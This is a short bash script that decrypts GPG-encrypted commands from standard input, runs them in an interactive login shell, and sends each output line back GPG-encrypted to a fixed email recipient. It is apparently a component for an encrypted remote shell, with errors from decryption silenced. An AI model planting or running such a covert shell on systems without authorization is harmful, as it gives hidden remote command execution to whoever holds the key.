#! /usr/bin/env bash
set -euo pipefail

GPG_FLAGS="${GPG_FLAGS:---compress-level=9 --bzip2-compress-level=9}"
GPG_FLAGS="${GPG_FLAGS} --batch --no-greeting --no-tty --quiet"

gpg $GPG_FLAGS --decrypt --allow-multiple-messages - 2> /dev/null |
/bin/bash -il 2>&1 |
while read -r line ; do
  gpg $GPG_FLAGS --encrypt --recipient InnovAnon-Inc@protonmail.com - <<< "$line"
done

